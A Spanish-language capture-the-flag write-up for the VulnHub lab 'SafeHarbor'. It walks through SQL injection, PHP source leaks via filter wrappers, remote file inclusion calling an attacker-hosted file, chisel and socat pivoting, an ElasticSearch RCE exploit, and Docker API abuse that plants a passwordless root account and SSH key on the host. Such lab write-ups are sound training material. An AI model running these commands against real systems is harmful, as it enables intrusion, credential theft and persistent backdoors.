# SafeHarbor (VulnHub - Medium) WriteUp Español

[🦔](#PreRequerimientos) #PreRequerimientos
- Inyección de comandos en GRUB
- Configuración de IP manual
- Sugerencia resolución DNS

[🦔](#Reconocimiento) #Reconocimiento
- Escaneo usual (IP, TTL, Puertos, Versiones y Servicios, Launchpad)
- Reconocimiento Web

[🦔](#VulnGathering) #VulnGathering
- Instalación de `pyenv` + ejecución de versión antigua de python
- Enumeración de directorios

[🦔](#Engaño) #Engaño
- Explicación `SQLi` clásica + inyección básica.

[🦔](#Explotación) #Explotación
- Manipulación de parámetros del servidor
- Visualización de código PHP con wrappers base 64 + obtención de credenciales
- Remote File Inclusion +Remote Code Execution (webshell)

[🦔](#GanarControl) #GanarControl
- Acceso a mysql con credenciales filtradas
- Desprendimiento de sesión con `nohup`
- Port Forwarding con chisel + proxychains + proxy socks5
- Enumeración de contenedores + automatización con python y bash
- Pivoteo de contenedores con explotación a versión vulnerable a RCE de ElasticSearch
- Enrutamiento de tráfico con socat
- Enlistar contenedores con curl
- Montación de contenedor privilegiado + RCE
- Creación de usuario + copia de ssh key en authorized_keys

[🦔](#Resultados-PoC) #Resultados-PoC


_Presiona al erizo para dirigirte al contenido._
#### PreRequerimientos
Se detectó que la máquina estaba diseñada para VirtualBox; por lo que, se utilizó VMware, aunque fue necesario realizar modificaciones.
Desde el GRUB, se inyectó el parámetro `init=/bin/bash` para obtener acceso root sin contraseña. A continuación se modificó la contraseña de usuario root y se configuró manualmente la red.
La interfaz relevante fue `ens33` y se estableció la IP estática mediante:
	
	ifconfig ens33 192.168.0.77 netmask 255.255.255.0
	route add default gw 192.168.0.1
	
Aunque no es  esencial para el ejercicio, la configuración resultante no resuelve salida a Internet, esto se conseguiría editando `etc/resolv.conf` cambiando `nameserver` por `8.8.8.8`. 

#### Reconocimiento
Se identificó la dirección IP de la máquina objetivo `192.168.0.77` mediante `ARP-scan`:
``` python
$sudo arp-scan -I wlp2s0 --localnet
Interface: wlp2s0, type: [...]

192.168.0.77	00:0c:29:50:ee:23	VMware, Inc.
```
El equipo fue identificado como una máquina virtual de VMware.

Se verificó la conectividad con un `ping`, recibiendo respuestas con un TTL de 64, lo cual indica un sistema Linux sin NAT adicional:
```python
64 bytes from 192.168.0.77: icmp_seq=1 ttl=64 time=19.0 ms
```

Posteriormente se realizó un escaneo de puertos completo con Nmap:``
```python
$sudo nmap -p- -sS --min-rate 5000 -n -Pn  192.168.0.77
[...]
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
2375/tcp filtered docker
```

Un escaneo más detallado se ejecutó, para identificar versiones y servicios:
```python
$sudo nmap -p22,80,2375 -sSCV 192.168.0.77
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| [...]
80/tcp   open     http    nginx 1.17.4
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.17.4
|_http-title: Login
2375/tcp filtered docker
```

Gracias a headers HTTP y Launchpad, se determinó el SO como Ubuntu 18.04 (Bionic)

Con `whatweb`, se identificaron las tecnologías del servidor web:
```python
$whatweb http://192.168.0.77/
http://192.168.0.77/ [200 OK] Bootstrap[3.3.7], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.17.4], IP[192.168.0.77], PHP[7.2.7], PasswordField[password], Title[Login], X-Powered-By[PHP/7.2.7], nginx[1.17.4]
```

Como resumen de resultados, se obtuvo:
- SSH en puerto 22: OpenSSH 7.6p1 (Ubuntu Bionic)
- HTTP en puerto 80: nginx 1.17.4 con PHP 7.2.7
- Docker en puerto 2375: Filtrado

#### VulnGathering
Se buscaron vulnerabilidades asociadas a la versión de `SSH` hallada . Entre los hallazgos, se encontró un exploit de enumeración de usuarios:
```java
$searchsploit ssh user enumeration
------------------------------------------------- -------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- -------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration         | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)   | linux/remote/45210.py
OpenSSH 7.2p2 - Username Enumeration             | linux/remote/40136.py
OpenSSH < 7.7 - User Enumeration (2)             | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration            | linux/remote/40113.txt
------------------------------------------------- -------------------------------
```

Se seleccionó uno de estos exploits y se renombró a `UserEnumeration22.py
```python
$searchsploit -m linux/remote/45939.py
  Exploit: OpenSSH < 7.7 - User Enumeration (2)
      URL: https://www.exploit-db.com/exploits/45939
     Path: /usr/share/exploitdb/exploits/linux/remote/45939.py
    Codes: CVE-2018-15473
 Verified: False
File Type: Python script, ASCII text executable
$mv 45939.py UserEnumeration22.py
```

En la línea: `#!/usr/bin/env python2.7` el script indica que se requiere una versión anterior de python.
Dado lo anterior, la ejecución se resolvió con `pyenv` donde se instalaron las siguientes dependencias:
```bash
sudo apt install -y make build-essential libssl-dev zlib1g-dev \
libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm \
libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev \
libffi-dev liblzma-dev
```

Se ejecutó el código de https://pyenv.run.
En la terminal utilizada se agregaron esta lineas al PATH:
```python
export PATH="$HOME/.pyenv/bin:$PATH"
eval "$(pyenv init --path)"
eval "$(pyenv init -)"
eval "$(pyenv virtualenv-init -)"
source ~/.bashrc
```

Posteriormente se instaló `pyhon2.7` con: `pyenv install 2.7.18 && pyenv global 2.7.18`

Después, sólo se instaló `paramiko` con `pip2 install paramiko` y se ejecutó con los argumentos requeridos,validando el usuario root existe:
```python
$./UserEnumeration22.py 192.168.0.77 root 2>/dev/null
[+] root is a valid username
```
Aunque también se notó que los resultados se vuelven triviales, al obtener respuestas similares a cualquier valor introducido:
```java
$./UserEnumeration22.py 192.168.0.77 tumama 2>/dev/null
[+] tumama is a valid username
```

 Se exploró el puerto 80, donde específicamente en directorios se llaron resultados con `gobuster` y el diccionario `directory-list-2.3-medium.txt`:
```python
$gobuster dir -u http://192.168.0.77/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,html,sh,txt
[...]
/.html                (Status: 403) [Size: 214]
/login.php            (Status: 200) [Size: 1303]
/changelog.txt        (Status: 200) [Size: 242]
/phpinfo.php          (Status: 200) [Size: 86117]
```

 Dados los resultados anteriores, se consultó `phpinfo.php`, donde se observó que algunos parámetros específicos están en `On`, por lo que se validó la vulnerabilidad `LFI` y `RFI`:

| DirectiveLocal    | ValueMaster | Value |
| ----------------- | ----------- | ----- |
| allow_url_fopen   | On          | On    |
| allow_url_include | On          | On    |
#### Engaño
 Con la información obtenida, se exploró vía web el sitio, para después, observar el login de un aparente banco, el cual no fue vulnerable a credenciales débiles, pero sí a SQLi. 
 Esto último se descubrió al interceptar con BurpSuite, con la línea:
```mysql
 user='+or1=1--+-&password='+or1=1--+-&s=Login
```
  En el `request`, el código devolvió este mensaje:
 
	Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/login.php on line 16

El error en el último mensaje explica que: el código intentó contar filas de un resultado SQL, pero en lugar de ser una consulta válida, devolvió un `false`, es decir,  el `input` se está metiendo en una consulta SQL sin validación, es decir, una _clásica SQLi_.
###### Explicación rápida:
Probablemente en la línea 16, existe algo como:
```php
$result = mysqli_query($conn, "SELECT * FROM users WHERE username = '$user' AND password = '$pass'");
if (mysqli_num_rows($result) > 0) { ... }
```
La inyección, rompe el flujo de esta manera:
```sql
SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = ''
```
Provocando que `mysqli_query()` de un `false` y que `mysqli_num_rows` un warning.

Regresando a la versión web, se tuvo más idea del funcionamiento del sitio web, por lo que procedemos a inyectar un payload que pueda funcionar: `tumama' OR 1=1#`, la respuesta en `http://192.168.0.77/OnlineBanking/index.php?p=welcome` fue la siguiente:
```html
<div align="center">
<h4>Welcome, tumama' OR 1=1#.</h4>
<body>Use the menu above to perform your online banking.</body>
</div>
```

#### Explotación
Teniendo un nivel de compromiso con el perfilamiento anterior, se revisó el sitio, en `http://192.168.0.77/OnlineBanking/index.php?p=balance` para visualizar nombres de usuarios a los que se puede hacer transferencia:
```html
<h4>Make a Transfer:</h4>
<body>
 <br></br>
 <br></br>
  <form action="" method="post">
   <div class="form-group">
    <select class="form-control" name="recipient" placeholder="Recipient">
     <option>Recipient</option>
     <option>Admin</option>
     <option>Bill</option>
     <option>Steve</option>
     <option>Timothy</option>
     <option>Jill</option>
     <option>Quinten</option>
    </select>
```

También se validaron las tecnologías usadas, identificadas en el reconocimiento en `http://192.168.0.77/OnlineBanking/index.php?p=about`:
```html
<h4>About Harbor Bank Online</h4>
<br></br>
<h5>Online Banking Version 1.1</h5>
<body>
Created with PHP, Apache, MySQL, Nginx.
<br></br>
Copyright Harbor Bank, 2019.
```

También existe un panel de cambio de contraseña en `http://192.168.0.77/OnlineBanking/index.php?p=account` donde con un cambio de parámetros, podemos cambiar la contraseña de cualquier usuario, pero necesitamos la contraseña actual.
Utilizando wrappers, podemos obtener el código php codificado de la siguiente forma: `http://192.168.0.77/OnlineBanking/index.php?p=php://filter/convert.base64-encode/resource=transfer`, el código obtenido es la lógica básica de cada contenido, aunque tambien obtenemos información interesante como:
```php
<?php

session_start();

if(is_null($_SESSION["loggedin"])){
	header("Location: /");
}

$dbServer = mysqli_connect('mysql','root','TestPass123!', 'HarborBankUsers');
$user = $_SESSION["username"];
[...]
?>
```

A juzgar por el escaneo de puertos, mysql puede ser el nombre de un contenedor, del cual ya tenemos las credenciales de root y el nombre de la base de datos.
Como habíamos visto en la configuración de `phpinfo.php`, también podemos probar RFI. Por ejemplo creando un archivo account.php basado en el código original y cambiando algunas líneas, como:
```php
$user = 'Admin';
[...]
if($oldPass != $currentPass){
```

Abriendo un recurso compartido y conectándose como `http://192.168.0.77/OnlineBanking/index.php?p=http://192.168.0.21/account`
Aunque teniendo acceso como Admin, no parece cambiar mucho el privilegio, pero se puede seguir explotando la vulnerabilidad.
Por ejemplo, auto generarse ingresos y que balance diga algo como:
```html
<div align="center">
<h4>Your current account balance is $99999999999.99</h4>
<body>If you would like to make a deposit, please call (555) 867-5309</body>
</div>
```

O siendo más enfocados, podemos hacer un RCE, por ejemplo en about reemplazar el código prescindible por algo como `<?php system(whoami);?>`, obteniendo esto:
```html
www-data

<!DOCTYPE html>
<html lang="en">
<head>
[...]
```

Al consultar usuarios con `<?php system("cat /etc/passwd");?>`, no encontramos un usuario válido, de hecho esta `nobody`... al consultar con `ifconfig`, la única interfaz además de la de loopback es esta:
```java
eth0      Link encap:Ethernet  HWaddr 02:42:AC:14:00:08  
          inet addr:172.20.0.8  Bcast:172.20.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3050 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3201 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:514016 (501.9 KiB)  TX bytes:556817 (543.7 KiB)
```

Casi confirmadísimo que estamos en un contenedor, y solo queda entrar con una revShell.
Por lo regular si hay php, entro con la opción de phassthru, pero esta vez la versión de pentest monkey en revshells.com fue más efectiva.

#### GanarControl
Retomamos el vector que se puede explotar con las credenciales de mysql
```bash
/ $ arp -a
? (172.20.0.1) at 02:42:81:f5:f0:1c [ether]  on eth0
harborbank_mysql_1.harborbank_backend (172.20.0.138) at 02:42:ac:14:00:8a [ether]  on eth0
```

Descargamos chisel y ejecutamos en la maquina atacante y víctima.
```python
servidor: $./chisel server --reverse -p 4444
cliente: ./chisel client 192.168.0.21:4444 R:1080:socks
```

En el archivo `/etc/proxychains.conf` agregamos la línea `socks5 127.0.0.1 1080`y nos conectamos a la IP que tiene mysql con las credenciales obtenidas:
```java
$proxychains mysql -uroot -h 172.20.0.138 -p
ProxyChains-3.1 (http://proxychains.sf.net)
Enter password: 
|S-chain|-<>-127.0.0.1:1080-<><>-172.20.0.138:3306-<><>-OK
Welcome to the MariaDB monitor.  Commands end with ; or \g.
```

Nos enteramos de la tabla `users` en la BD `HarborBankUsers` y aparte de los datos cambiados a Admin, encontramos las contraseñas de los demás usuarios:
```mysql
MySQL [HarborBankUsers]> select * from users
    -> ;
+----+----------+------------------+----------------+
| id | username | password         | balance        |
+----+----------+------------------+----------------+
|  6 | Admin    | admin            | 99999999999.99 |
|  7 | Bill     | e_PLJ3cyVEVnxY7  |        2384.94 |
|  8 | Steve    | z_&=_KwMM*3D7AzC |       92324.37 |
|  9 | Jill     | ^&3JneRScU*Tt4-v |        3579.42 |
| 10 | Timothy  | $hBW!!NL52azb+HY |         514.90 |
| 11 | Quinten  | mvTvt3u-9CeVB@26 |       62124.84 |
+----+----------+------------------+----------------+
6 rows in set (0.009 sec)
```

Ninguno de estos usuarios es válido para ssh. Toca seguir en reconocimiento, tal vez a otros contenedores. Pero a falta de hacer un reconocimiento de IP's con `nmap -sn 172.20.0.0/24`, optamos por una opción con python:
```python
$proxychains python3 -c "
import socket
for i in range(1, 255):
  try:
    s = socket.create_connection(('172.20.0.'+str(i), 80), timeout=1)
    print('Host up:', '172.20.0.'+str(i))
    s.close()
  except:
    pass
" | grep OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.20.0.1:80-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.20.0.2:80-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.20.0.4:80-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.20.0.5:80-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.20.0.6:80-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.20.0.7:80-<><>-OK
```

En estas direcciones, encontramos algo diferente a Apache y Nginx solo en `172.20.0.2`:
```python
$proxychains whatweb http://172.20.0.2
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-172.20.0.2:80-<><>-OK
http://172.20.0.2 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.8.1], IP[172.20.0.2], Script, Title[Kibana 3{{dashboard.current.title ? " - "+dashboard.current.title : ""}}], X-UA-Compatible[IE=edge], nginx[1.8.1]
```

> Para desprendernos de la "sesión" de la revshell, podemos subir a /tmp el payload, en este caso `about.php` y ejecutar `nohup php about.php &`
> Cuando la shell sea limitada, se puede usar `rlwrap` antes de poner el puerto en escucha, para tener una shell interactiva.

Haciendo reconocimiento, las IP's y servicios, estos aparecían para el comando `arp` cuando mandaba un whatweb a alguna dirección disponible. Con este comando automaticé las consultas: `seq 2 254 | xargs -P20 -I {} proxychains whatweb https://172.20.0.{} 2>&1`. Después de cubrir todos los posibles rangos de IP's, obtuvimos este reconocimiento:
```python
/ $ arp -a | grep -v "<incomplete>"
harborbank_nginx_1.harborbank_backend (172.20.0.4) 
at 02:42:ac:14:00:04 [ether]  on eth0
harborbank_logstash_1.harborbank_backend (172.20.0.3)         ----->logstash
at 02:42:ac:14:00:03 [ether]  on eth0
harborbank_apache_1.harborbank_backend (172.20.0.7) 
at 02:42:ac:14:00:07 [ether]  on eth0
harborbank_kibana_1.harborbank_backend (172.20.0.2)           ----->kibana
at 02:42:ac:14:00:02 [ether]  on eth0
harborbank_apache_v2_1.harborbank_backend (172.20.0.6) 
at 02:42:ac:14:00:06 [ether]  on eth0
? (172.20.0.1) at 02:42:c5:d9:f6:b0 [ether]  on eth0
harborbank_apache_v2_2.harborbank_backend (172.20.0.5) 
at 02:42:ac:14:00:05 [ether]  on eth0
harborbank_elasticsearch_1.harborbank_backend (172.20.0.124) ----->elasticsearch
harborbank_mysql_1.harborbank_backend (172.20.0.138) 
at 02:42:ac:14:00:8a [ether]  on eth0
```

ElasticSearch es un motor de búsqueda distribuido, su puerto por defecto es 9200 y lo podemos validar:
```python
$proxychains curl http://172.20.0.124:9200
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-172.20.0.124:9200-<><>-OK
{
  "status" : 200,
  "name" : "Klaw",
  "cluster_name" : "elasticsearch",
  "version" : {
    "number" : "1.4.2",
    "build_hash" : "927caff6f05403e936c20bf4529f144f0c89fd8c",
    "build_timestamp" : "2014-12-16T14:11:12Z",
    "build_snapshot" : false,
    "lucene_version" : "4.10.2"
  },
  "tagline" : "You Know, for Search"
}
```
 Teniendo la versión podemos ver que hay un exploit disponible:
 ```python
 $searchsploit elasticsearch
------------------------------------------------- -------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- -------------------------------
ElasticSearch - Remote Code Execution            | linux/remote/36337.py
[...]                                            | [...]
------------------------------------------------- -------------------------------
 ```

Información del exploit:
 ```python
$searchsploit -m linux/remote/36337.py
  Exploit: ElasticSearch - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/36337
     Path: /usr/share/exploitdb/exploits/linux/remote/36337.py
    Codes: CVE-2015-1427, OSVDB-118239
 Verified: True
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/kmxbay/Documentos/VulnHub/SafeHarbor/36337.py
 ```

Revisando el código, notamos que pide el host y un path, pero necesitamos python 2 y la librería requests. Para eso utilizamos pyenv como en el exploit pasado y descargamos requests con pip.
```python
export PATH="$HOME/.pyenv/bin:$PATH"
eval "$(pyenv init --path)"
eval "$(pyenv init -)"
eval "$(pyenv virtualenv-init -)"

source ~/.bashrc
pip install requests
```

Con esto tenemos acceso root, al contenedor de ElasticSearch: 
```java
{*} Spawning Shell on target... Do note, its only semi-interactive... Use it to drop a better payload or something
~$ whoami
|S-chain|-<>-127.0.0.1:1080-<><>-172.20.0.124:9200-<><>-OK
root
~$ hostname -I
|S-chain|-<>-127.0.0.1:1080-<><>-172.20.0.124:9200-<><>-OK
172.20.0.124
```

Dentro del host de ElasticSearch encontramos algo interesante en el historial del bash:
```java
$ cat /root/.bash_history
|S-chain|-<>-127.0.0.1:1080-<><>-172.20.0.124:9200-<><>-OK
ls
ifconfig
ip addr
curl 172.20.0.1:2375
exit
curl 172.20.0.1:2375
exit
curl 172.20.0.1:2375
exit
curl 172.20.0.1:2375
exit
```

El puerto `2375` ya había sido identificado previamente como expuesto en la máquina host. Esto indica que, si logramos acceder o pivotear hacia la máquina `172.20.0.1`, tendremos acceso al daemon Docker sin autenticación, lo que equivale a obtener control sobre el sistema.

Tal como se mencionaba en el exploit sobre la máquina `172.20.0.124`, la shell obtenida es *semi-interactiva*, lo que impide ejecutar algunos comandos como `cd` o visualizar los contenedores directamente. 

Además, no es posible crear nuevos contenedores desde esa shell, ya que necesitamos enrutar el tráfico que llega a la máquina real hacia nuestra máquina atacante para mantener el control.

En la máquina `172.20.0.8`, se configura `socat` para escuchar en el puerto `1090`, redirigiendo todo el tráfico recibido hacia la IP de la máquina atacante (`192.168.0.21`) por el puerto donde está corriendo el servidor Chisel:
```python
./socat TCP-LISTEN:1090,fork TCP:192.168.0.21:4444
```

Luego, en la máquina `172.20.0.124`, se establece un cliente Chisel que conecta con el servicio expuesto por socat:
```python
./chisel client 172.20.0.8:1090 R:1081:socks
```

Como resultado, en el servidor Chisel de la máquina atacante se visualiza lo siguiente, indicando que el túnel SOCKS se estableció correctamente:
```js
[DATE] server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
[DATE] server: session#2: tun: proxy#R:127.0.0.1:1081=>socks: Listening
```

Haciendo unos arreglos en la información que podemos consultar sobre las imágenes, obtenemos los nombres de los imágenes de los contenedores. (Como ver la columna `IMAGE` que daría el comando `docker ps` en la máquina víctima)
`proxychains curl http://172.20.0.1:2375/images/json 2>/dev/null | grep -v "proxychains" | jq -r '.[].RepoTags[]'`
```js
harborbank_kibana:latest
harborbank_apache_v2:latest
harborbank_logstash:latest
harborbank_nginx:latest
harborbank_apache:latest
harborbank_php:latest
harborbank_mysql:latest
harborbank_elasticsearch:latest
nginx:latest
debian:jessie
logstash:7.1.1
alpine:3.2
mysql:5.6.40
php:7.2.7-fpm-alpine3.7
httpd:2.4.33-alpine
```

Posteriormente, podemos montar en el socket un contenedor privilegiado. Es decir montar el sistema anfitrión desde la raíz, en otras palabras, una puerta trasera al sistema completo.

Nos apoyamos de [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/2375-pentesting-docker.html) y hacemos los ajustes para esta máquina.

Creamos el contenedor, usando una de las imágenes `alpine:3.2`:
```python
$proxychains curl -X POST -H "Content-Type: application/json" http://172.20.0.1:2375/containers/create?name=test -d '{"Image":"alpine:3.2", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:1081-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:1081-<><>-172.20.0.1:2375-<><>-OK
{"Id":"71339b9a05c0b8a3f733547781a7b076a837ebf1602db558441e8552b024f67e","Warnings":null}
```

Agarramos el Id que obtenemos, para iniciar este contenedor:
```python
proxychains curl -X POST -H "Content-Type: application/json" http://172.20.0.1:2375/containers/71339b9a05c0b8a3f733547781a7b076a837ebf1602db558441e8552b024f67e/start?name=test
```

Con esto, ya podemos ejecutar comandos, así que vamos a probar, revisando el directorio /root por alguna tentativa flag:
```python
proxychains curl -X POST -H "Content-Type: application/json" http://172.20.0.1:2375/containers/71339b9a05c0b8a3f733547781a7b076a837ebf1602db558441e8552b024f67e/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "ls -la /mnt/root/"]}'
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:1081-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:1081-<><>-172.20.0.1:2375-<><>-OK
{"Id":"0f1b421ec0fd5f7324eb3f521b51b542fb0667d3bf8e003bf3660092aa213118"}
```

Para ejecutar el comando que le mandamos, usamos el Id obtenido, con este comando:
```python
proxychains curl -X POST -H "Content-Type: application/json" http://172.20.0.1:2375/exec/0f1b421ec0fd5f7324eb3f521b51b542fb0667d3bf8e003bf3660092aa213118/start -d '{}' --output -
```

Efectivamente, vemos 3 banderas:
```js
-rw-r--r--    1 root     root          2805 May  6 21:50 Bonus_Flag_1.txt
-rw-r--r--    1 root     root          3736 Oct  6  2019 Bonus_Flag_2.txt
-rw-r--r--    1 root     root          1408 Oct  6  2019 Flag.txt
```

Para nuestra explotación, podemos hacer algo más personalizado: 
Escribiremos un usuario root: `echo alexi::0:0::/root:/bin/bash >> /mnt/etc/passwd`
Lo habilitamos en /etc/shadow: ` echo alexi::18922:0:99999:7::: >> /mnt/etc/shadow`
Le damos acceso sin contraseña: `echo PermitEmptyPasswords yes >> /mnt/etc/ssh/sshd_config`

Todo esto lo construimos parael payload, tomando en cuenta la ejecución anterior:
```python
proxychains curl -X POST -H "Content-Type: application/json" \
http://172.20.0.1:2375/containers/71339b9a05c0b8a3f733547781a7b076a837ebf1602db558441e8552b024f67e/exec \
-d '{
  "AttachStdout": true,
  "AttachStderr": true,
  "Cmd": ["/bin/sh", "-c", "echo alexi::0:0::/root:/bin/bash >> /mnt/etc/passwd && echo alexi::18922:0:99999:7::: >> /mnt/etc/shadow && echo PermitEmptyPasswords yes >> /mnt/etc/ssh/sshd_config"]
}'
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:1081-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:1081-<><>-172.20.0.1:2375-<><>-OK
{"Id":"828cd8c352d73246fd0762d8df19d1c6665f06eec5a2920679a69f25649119b1"}
```
Y ejecutamos el payload:
```python
proxychains curl -X POST -H "Content-Type: application/json" http://172.20.0.1:2375/exec/828cd8c352d73246fd0762d8df19d1c6665f06eec5a2920679a69f25649119b1/start -d '{}' --output -
```

Para poder conectarnos vía ssh, tenemos que hacer que nuestra llave esté en `authorized_keys`
Pegamos nuestra llave:
```python
proxychains curl -X POST -H "Content-Type: application/json" http://172.20.0.1:2375/containers/71339b9a05c0b8a3f733547781a7b076a837ebf1602db558441e8552b024f67e/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "echo ssh-rsa Ll4v3_C0d1fIc4d4== nombre@host > /mnt/root/.ssh/authorized_keys"]}'
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:1081-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:1081-<><>-172.20.0.1:2375-<><>-OK
{"Id":"de5250994b2c68e1bdebb6b21f6e0ec7693ceb050421ea4e19d4057f791e8b54"}
```
Y al ejecutar este payload se quedará pensando, pero podemos cortarlo y obtener acceso a ssh sin problema.
```python
proxychains curl -X POST -H "Content-Type: application/json" http://172.20.0.1:2375/exec/de5250994b2c68e1bdebb6b21f6e0ec7693ceb050421ea4e19d4057f791e8b54/start -d '{}' --output -
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:1081-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:1081-<><>-172.20.0.1:2375-<><>-OK
```
Con esto vemos que podemos entrar como root a la máquina original:
```js
$ssh alexi@192.168.0.77
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

 * [...]
 
  System information as of 

  System load:  0.01               Users logged in:                1
  Usage of /:   53.4% of 14.70GB   IP address for ens33:           192.168.0.77
  Memory usage: 78%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-b8fe54f77458: 172.20.0.1
  Processes:    200


 * [...]
Last login:
root@safeharbor:~# 
```

#### Resultados-PoC
Consultando las flags obtenidas:
```js
root@safeharbor:~# cat Flag.txt 
           _-_										
          |(_)|										
           |||										
           |||										
           |||										
           |||										
           |||										
     ^     |^|     ^									
   < ^ >   <+>   < ^ >									
    | |    |||    | |									
     \ \__/ | \__/ /									
       \,__.|.__,/									
           (_)			

   .---.  .--.  ,---.,---.  .-. .-.  .--.  ,---.    ,---.    .---.  ,---.    
  ( .-._)/ /\ \ | .-'| .-'  | | | | / /\ \ | .-.\   | .-.\  / .-. ) | .-.\   
 (_) \  / /__\ \| `-.| `-.  | `-' |/ /__\ \| `-'/   | |-' \ | | |(_)| `-'/   
 _  \ \ |  __  || .-'| .-'  | .-. ||  __  ||   (    | |--. \| | | | |   (    
( `-'  )| |  |)|| |  |  `--.| | |)|| |  |)|| |\ \   | |`-' /\ `-' / | |\ \   
 `----' |_|  (_))\|  /( __.'/(  (_)|_|  (_)|_| \)\  /( `--'  )---'  |_| \)\  
               (__) (__)   (__)                (__)(__)     (_)         (__) 
			   
			   		   
											
Congratulations! You've finished SafeHarbor! This is flag 1 of 3. 			
Bonus flags will appear based on actions taken during the course of the VM.
(You got this one for a vanilla finish - no special actions taken.)	

Proof: 8bd9affc2d9905e9e2dbd8e209bf53c0	

Author: AbsoZed (Dylan Barker)
https://caffeinatednegineers.com
```


```js
root@safeharbor:~# cat Bonus_Flag_2.txt 
         . . .                         
              \|/                          
            `--+--'                        
              /|\                          
             ' | '                         
               |                           
               |                           
           ,--'#`--.                       
           |#######|                       
        _.-'#######`-._                    
     ,-'###############`-.                 
   ,'#####################`,               
  /#########################\              
 |###########################|             
|#############################|            
|#############################|            
|#############################|            
|#############################|            
 |###########################|             
  \#########################/              
   `.#####################,'               
     `._###############_,'                 
        `--..#####..--'

   ▄████████    ▄████████    ▄████████    ▄████████    ▄█    █▄       ▄████████    ▄████████ ▀█████████▄   ▄██████▄     ▄████████ 
  ███    ███   ███    ███   ███    ███   ███    ███   ███    ███     ███    ███   ███    ███   ███    ███ ███    ███   ███    ███ 
  ███    █▀    ███    ███   ███    █▀    ███    █▀    ███    ███     ███    ███   ███    ███   ███    ███ ███    ███   ███    ███ 
  ███          ███    ███  ▄███▄▄▄      ▄███▄▄▄      ▄███▄▄▄▄███▄▄   ███    ███  ▄███▄▄▄▄██▀  ▄███▄▄▄██▀  ███    ███  ▄███▄▄▄▄██▀ 
▀███████████ ▀███████████ ▀▀███▀▀▀     ▀▀███▀▀▀     ▀▀███▀▀▀▀███▀  ▀███████████ ▀▀███▀▀▀▀▀   ▀▀███▀▀▀██▄  ███    ███ ▀▀███▀▀▀▀▀   
         ███   ███    ███   ███          ███    █▄    ███    ███     ███    ███ ▀███████████   ███    ██▄ ███    ███ ▀███████████ 
   ▄█    ███   ███    ███   ███          ███    ███   ███    ███     ███    ███   ███    ███   ███    ███ ███    ███   ███    ███ 
 ▄████████▀    ███    █▀    ███          ██████████   ███    █▀      ███    █▀    ███    ███ ▄█████████▀   ▀██████▀    ███    ███ 
                                                                                  ███    ███                           ███    ███ 


Congratulations! You've finished SafeHarbor! This is flag 3 of 3. 			
Bonus flags will appear based on actions taken during the course of the VM.
(You got this one because you blew up the docker environment. Way to go.)

Proof: 5d3f6060e6d2d9cfccbcc053ed58e971

Author: AbsoZed (Dylan Barker)
https://caffeinatednegineers.com	
```




```js
root@safeharbor:~# cat Bonus_Flag_1.txt 
 |.============[_F_E_D_E_R_A_L___R_E_S_E_R_V_E___N_O_T_E_]=============.|
 ||%&%&%&%_    _        _ _ _   _ _  _ _ _     _       _    _  %&%&%&%&||
 ||%&.-.&/||_||_ | ||\||||_| \ (_ ||\||_(_  /\|_ |\|V||_|)|/ |\ %&.-.&&||
 ||&// |\ || ||_ \_/| ||||_|_/ ,_)|||||_,_) \/|  ||| ||_|\|\_|| &// |\%||
 ||| | | |%               ,-----,-'____'-,-----,               %| | | |||
 ||| | | |&% """"""""""  [    .-;"`___ `";-.    ]             &%| | | |||
